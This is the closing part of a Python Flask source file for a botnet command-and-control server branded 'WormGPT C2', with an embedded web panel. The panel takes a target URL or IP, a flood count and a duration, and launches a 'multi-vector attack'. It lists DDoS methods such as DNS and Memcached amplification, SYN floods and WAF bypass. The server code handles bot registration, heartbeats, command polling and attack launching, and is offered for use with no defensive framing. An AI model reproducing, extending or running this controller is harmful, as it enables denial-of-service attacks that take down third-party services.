            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .status-bar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 8px 16px;
            background: rgba(0, 0, 0, 0.7);
            border-bottom: 1px solid rgba(255, 0, 0, 0.1);
            font-size: 11px;
            color: #555;
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
    
    <div class="status-bar">
        <div><span class="node-indicator"></span>WormGPT C2 v9.0 | Distributed Attack Platform | Nodes: <span id="nodeCount">0</span></div>
        <div id="systemStatus">C2 Online</div>
    </div>
    
    <div class="main-container">
        <div style="text-align: center; padding: 30px 0;">
            <h1 class="text-4xl font-bold header-glow" style="color: #ff0000;">WormGPT C2</h1>
            <p style="color: #444; font-size: 12px; margin-top: 8px; letter-spacing: 4px;">DISTRIBUTED ATTACK PLATFORM</p>
        </div>
        
        <!-- Stats Panel -->
        <div class="panel">
            <div class="panel-title">Network Status</div>
            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;">
                <div class="stat-box">
                    <div class="stat-value" id="statNodes">0</div>
                    <div class="stat-label">Active Nodes</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statSent">0</div>
                    <div class="stat-label">Packets Sent</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statFailed">0</div>
                    <div class="stat-label">Failed</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statBw">0</div>
                    <div class="stat-label">GB/s</div>
                </div>
            </div>
        </div>
        
        <!-- Attack Vectors -->
        <div class="panel">
            <div class="panel-title">Active Vectors</div>
            <div>
                <span class="vector-tag">HTTP/2 Multiplex</span>
                <span class="vector-tag">Slowloris TLS</span>
                <span class="vector-tag">DNS Amplification</span>
                <span class="vector-tag">NTP Reflection</span>
                <span class="vector-tag">Memcached Amp</span>
                <span class="vector-tag">SSDP Reflection</span>
                <span class="vector-tag">SYN Flood</span>
                <span class="vector-tag">ACK/PUSH/RST</span>
                <span class="vector-tag">ICMP Fragment</span>
                <span class="vector-tag">GRE Protocol</span>
                <span class="vector-tag">SSL Renegotiation</span>
                <span class="vector-tag">Zip Bomb</span>
                <span class="vector-tag">SQL Flood</span>
                <span class="vector-tag">WAF Bypass</span>
                <span class="vector-tag">JA3 Randomize</span>
                <span class="vector-tag">Proxy Rotation</span>
                <span class="vector-tag">Tor Routing</span>
                <span class="vector-tag">Domain Fronting</span>
                <span class="vector-tag">Fast-Flux DNS</span>
                <span class="vector-tag">Geo-Routing</span>
            </div>
        </div>
        
        <!-- Attack Form -->
        <div class="panel">
            <div class="panel-title">Attack Configuration</div>
            <input type="text" id="target" class="input-field" placeholder="Target URL / IP (http://target.com atau 1.2.3.4)">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <input type="number" id="flood" class="input-field" placeholder="Jumlah Flood (ex: 1000000)">
                <input type="number" id="time" class="input-field" placeholder="Durasi (detik)">
            </div>
            <button class="btn-launch" id="launchBtn" onclick="launchAttack()">INITIATE MULTI-VECTOR ATTACK</button>
            
            <div class="progress-container" style="display:none;" id="progressContainer">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <!-- Terminal Output -->
        <div class="panel">
            <div class="panel-title">C2 Command Log</div>
            <div class="terminal-output" id="terminalOutput">
                <div class="log-line"><span class="log-time">[00:00:00]</span><span class="log-info">WormGPT C2 initialized</span></div>
                <div class="log-line"><span class="log-time">[00:00:00]</span><span class="log-info">Botnet controller ready</span></div>
                <div class="log-line"><span class="log-time">[00:00:00]</span><span class="log-info">Layer 7 engine loaded</span></div>
                <div class="log-line"><span class="log-time">[00:00:00]</span><span class="log-info">Layer 4 engine loaded</span></div>
                <div class="log-line"><span class="log-time">[00:00:00]</span><span class="log-info">Resource exhaustion module loaded</span></div>
                <div class="log-line"><span class="log-time">[00:00:00]</span><span class="log-success">All systems operational</span></div>
            </div>
        </div>
    </div>
    
    <script>
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function drawMatrix() {
            ctx.fillStyle = 'rgba(5, 5, 8, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = 'rgba(255, 0, 0, 0.15)';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);
        
        function log(msg, type='info') {
            const out = document.getElementById('terminalOutput');
            const now = new Date().toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
            const cls = type === 'success' ? 'log-success' : type === 'warn' ? 'log-warn' : 'log-info';
            out.innerHTML += `<div class="log-line"><span class="log-time">[${now}]</span><span class="${cls}">${msg}</span></div>`;
            out.scrollTop = out.scrollHeight;
        }
        
        function updateStats() {
            fetch('/stats').then(r => r.json()).then(d => {
                document.getElementById('statNodes').innerText = d.nodes;
                document.getElementById('statSent').innerText = d.sent.toLocaleString();
                document.getElementById('statFailed').innerText = d.failed.toLocaleString();
                document.getElementById('statBw').innerText = (d.bandwidth / 1024 / 1024 / 1024).toFixed(2);
                document.getElementById('nodeCount').innerText = d.nodes;
            });
        }
        setInterval(updateStats, 2000);
        
        async function launchAttack() {
            const target = document.getElementById('target').value;
            const flood = document.getElementById('flood').value;
            const time = document.getElementById('time').value;
            if (!target || !flood || !time) return;
            
            document.getElementById('launchBtn').disabled = true;
            document.getElementById('progressContainer').style.display = 'block';
            log('Initiating multi-vector attack sequence...', 'warn');
            
            const bar = document.getElementById('progressBar');
            let prog = 0;
            const intv = setInterval(() => {
                prog += 100 / (time * 10);
                if (prog >= 100) { prog = 100; clearInterval(intv); }
                bar.style.width = prog + '%';
            }, 100);
            
            try {
                const res = await fetch('/launch', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target, flood, time})
                });
                const data = await res.json();
                log(`Attack completed. Sent: ${data.sent}, Failed: ${data.failed}`, 'success');
            } catch(e) {
                log('Attack sequence error', 'warn');
            }
            
            document.getElementById('launchBtn').disabled = false;
            document.getElementById('progressContainer').style.display = 'none';
            bar.style.width = '0%';
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/stats')
def stats():
    return jsonify({
        "nodes": BOTNET.get_node_count(),
        "sent": BOTNET.attack_stats["sent"],
        "failed": BOTNET.attack_stats["failed"],
        "bandwidth": BOTNET.attack_stats.get("bandwidth", 0),
    })

@app.route('/launch', methods=['POST'])
def launch():
    data = request.get_json()
    target = data.get('target', '')
    flood = data.get('flood', 100000)
    time_val = data.get('time', 60)
    
    threading.Thread(target=launch_full_attack, args=(target, flood, time_val), daemon=True).start()
    
    return jsonify({
        "status": "launched",
        "target": target,
        "vectors": 13,
        "nodes": BOTNET.get_node_count(),
    })

@app.route('/register', methods=['POST'])
def register_node():
    data = request.get_json()
    node_id = BOTNET.register_node(data)
    return jsonify({"node_id": node_id, "status": "registered"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    node_id = data.get('node_id')
    if BOTNET.heartbeat(node_id):
        return jsonify({"status": "ok"})
    return jsonify({"status": "unknown_node"}), 404

@app.route('/command', methods=['GET'])
def get_command():
    node_id = request.args.get('node_id')
    if node_id and BOTNET.heartbeat(node_id):
        # Return pending command for this node
        return jsonify({"command": "attack", "payload": {}})
    return jsonify({"command": "idle"})

if __name__ == '__main__':
    print("\n" + "═"*70)
    print("  WORMGPT C2 - Distributed Attack Platform v9.0".center(68))
    print("  Command & Control Server".center(68))
    print("═"*70)
    print("  Server: http://localhost:4121")
    print("  Max Nodes: 15,000 concurrent")
    print("  Vectors: 13 multi-layer attack methods")
    print("  Features: Botnet | Amplification | WAF Bypass | Auto-Scale")
    print("═"*70 + "\n")
    app.run(host='0.0.0.0', port=4121, debug=False, threaded=True)

